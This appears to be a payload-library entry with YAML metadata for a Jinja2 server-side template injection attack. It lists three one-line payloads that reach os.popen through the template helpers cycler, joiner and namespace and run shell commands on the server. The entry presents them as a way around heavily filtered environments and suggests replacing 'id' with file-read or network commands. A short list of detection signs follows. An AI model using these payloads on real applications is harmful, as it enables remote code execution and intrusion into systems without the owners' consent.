---
type: code
language: python
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tags:
  - ssti
  - jinja2
  - rce
  - os-popen
  - bypass
platforms:
  - Web
  - Linux
validated: true
---

# Jinja2-SSTI-Cycler-Joiner-Namespace-os-popen-id

## Code

```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

## Description

A shorter variant using direct references to Jinja2 context helpers (cycler, joiner, namespace) to reach os globals and execute 'id' commands via popen. Provides fallback for heavily filtered environments.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 'id' | Shell command run per line | 'id', 'ps aux', 'netstat -an' |

## Usage

Inject when full context paths are blocked. Useful for quick RCE tests; replace 'id' with payloads for file reads or network interactions.

## Detection

- Server-side traces of helper object attribute traversal.
- Response with repeated system command outputs.
- Input validation failures on short SSTI chains.

## Related

- [[procedures/Jinja2-Server-Side-Template-Injection-with-os-popen-read]]
